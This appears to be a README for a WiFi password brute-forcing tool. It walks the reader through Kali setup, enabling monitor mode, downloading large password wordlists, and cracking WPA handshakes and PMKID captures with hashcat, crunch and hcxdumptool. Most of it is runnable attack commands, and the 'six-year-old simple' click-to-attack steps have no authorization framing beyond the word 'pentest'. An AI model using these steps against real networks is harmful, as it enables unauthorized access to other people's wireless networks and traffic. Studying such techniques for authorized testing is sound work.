# WiFi Brute Forcer - Pentest Tool

## Kali Setup
```bash
sudo apt install python3-pywifi python3-scapy
pip install pywifi netifaces

# Set monitor mode (run as root)
sudo airmon-ng start wlan0
sudo python3 bruteforce.py

//
How to Use (6yo simple):
Click SCAN NETWORKS (big green button)
Pick WiFi name from dropdown
Click QUICK ATTACK (orange) or FULL BRUTE (red)
Watch magic happen!

Get wordlists
# Kali commands - run in your wifi-bruter folder
mkdir wordlists/big
cd wordlists/big

# RockYou (14M passwords - gold standard)
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# CrackStation (1.5B words)
wget https://crackstation.net/files/crackstation-human-only.txt.gz
gunzip crackstation-human-only.txt.gz

# SecLists (pentest standard collection)
git clone https://github.com/danielmiessler/SecLists.git
cp SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt .

# WiFi-specific
wget https://raw.githubusercontent.com/kerberos225/wpa2-wordlist/master/wpa2-wordlist.txt


-------Remember------

# 1. Run with GPU acceleration (hashcat alternative)
hashcat -m 2500 capture.hccapx rockyou.txt

# 2. Generate custom wordlist from company info
crunch 8 8 -t company%% -o wordlists/custom.txt

# 3. Monitor mode for PMKID attack (faster)
hcxdumptool -i wlan0mon --enable_status=1 -o capture.pcapng
hcxpcapngtool -o hash.hc22000 capture.pcapng